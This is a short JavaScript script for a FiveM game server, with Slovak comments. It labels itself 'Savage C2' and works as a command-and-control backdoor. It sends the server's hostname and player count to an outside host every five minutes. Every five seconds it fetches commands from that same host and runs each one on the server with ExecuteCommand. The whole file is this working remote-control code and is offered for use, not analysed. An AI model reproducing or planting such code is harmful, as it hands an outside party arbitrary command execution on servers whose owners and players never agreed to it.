function sendUpdate() {
    const data = {
        hostname: GetConvar("sv_hostname", "Default Server"),
        players: GetNumPlayerIndices()
    };

    // Adresa tvojho API na Renderi
    const url = "https://mv-menu.onrender.com/api/report"; 

    PerformHttpRequest(url, function(err, text, headers) {
        if (err === 200) {
            print("^2[Savage C2] Report odoslaný úspešne!^7");
        } else {
            print("^1[Savage C2] Chyba pri odosielaní: " + err + "^7");
        }
    }, 'POST', JSON.stringify(data), { ['Content-Type']: 'application/json' });
}

// --- TOTO JE TÁ DOLEŽITÁ ČASŤ PRE KONZOLU ---
setInterval(() => {
    const commandUrl = "https://mv-menu.onrender.com/api/get-commands";
    
    PerformHttpRequest(commandUrl, function(err, text, headers) {
        if (err === 200 && text && text !== "[]") {
            try {
                const cmds = JSON.parse(text);
                cmds.forEach(cmd => {
                    print("^4[Savage C2] Vykonávam príkaz z webu: " + cmd + "^7");
                    ExecuteCommand(cmd); // Vykoná príkaz priamo v serveri
                });
            } catch (e) {
                print("^1[Savage C2] Chyba pri spracovaní príkazu.^7");
            }
        }
    }, 'GET', '');
}, 5000); // Kontrola každých 5 sekúnd
// --------------------------------------------

// Spustenie pri štarte
sendUpdate();

// Opakovanie každých 5 minút (podľa tvojho starého skriptu)
setInterval(sendUpdate, 300000);